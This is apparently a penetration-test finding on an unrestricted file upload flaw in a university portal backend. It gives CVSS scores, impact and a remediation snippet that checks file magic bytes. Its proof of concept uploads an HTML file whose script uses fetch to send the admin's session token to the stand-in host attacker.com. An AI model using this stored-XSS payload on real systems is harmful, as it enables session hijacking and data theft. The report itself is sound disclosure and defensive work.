# \[VUL-010\] Unrestricted File Upload — No Server-Side Content Validation

| Attribute | Details |
|---|---|
| Severity | High |
| CVSS v3.1 Score | 8.1 (`CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N`) |
| CVSS v4.0 Score | 7.7 (`CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N`) |
| Vulnerability Class | OWASP A04:2021 – Insecure Design · CWE-434: Unrestricted Upload of File with Dangerous Type |
| Affected Endpoint | `POST /api/v1/applicants` · `POST /api/v1/applicants/:id/resubmit` |
| Source Location | `qcu-msc-central-portal-backend/src/controllers/applicant.controller.ts` |

## 1. Vulnerability Description

File validation is performed exclusively on the frontend (`<input accept="...">` attributes). The backend Multer configuration does not validate file extensions, check MIME types from the `Content-Type` header, or inspect magic bytes. When served back via the authenticated document endpoint with `Content-Disposition: inline` and no `X-Content-Type-Options: nosniff`, browsers may render uploaded HTML files as web pages, executing embedded JavaScript in the admin's session context.

## 2. Business & Technical Impact

**Technical Impact:** Stored XSS in the admin portal via document upload. Admin session compromise and data exfiltration.

**Business Impact:** Complete admin portal compromise chain initiated by an applicant.

## 3. Proof of Concept (PoC)

**Step 1:** Intercept the application submission in Burp Suite. Replace the CoR file:

```
POST /api/v1/applicants HTTP/1.1
Host: api.msc-qcu.tech
Content-Type: multipart/form-data; boundary=----boundary
Cookie: better-auth.session_token=<SANITIZED>

------boundary
Content-Disposition: form-data; name="certificateOfRegistration"; filename="cor.html"
Content-Type: text/html

<script>fetch('https://attacker.com/?t='+sessionStorage.getItem('accessToken'))</script>
------boundary--
```

**Step 2:** Admin HR opens the document → script executes in admin context → token exfiltrated.

Note: This can be exploited as well by simply filling up the application form and submitting a malicious file in the CoR and CV file upload field. Once the admin/hr clicked the submitted document in the admin portal thinking that it is safe, it will immediately execute the malicious file that the attacker attached, and it can cause a lot of problem especially that the one who will trigger it has the admin role.

## 4. Remediation & Guidance

**Root Cause Fix:** Add server-side magic byte validation using the `file-type` npm package:

```typescript
import { fileTypeFromBuffer } from "file-type";

const ALLOWED = ["application/pdf", "image/jpeg", "image/png"];
const detected = await fileTypeFromBuffer(file.buffer);
if (!detected || !ALLOWED.includes(detected.mime)) {
  return res.status(400).json({ success: false, message: "Invalid file type." });
}
```

**Short-Term Workaround:** Change `Content-Disposition` to `attachment`. Add `X-Content-Type-Options: nosniff` globally (see VUL-008).
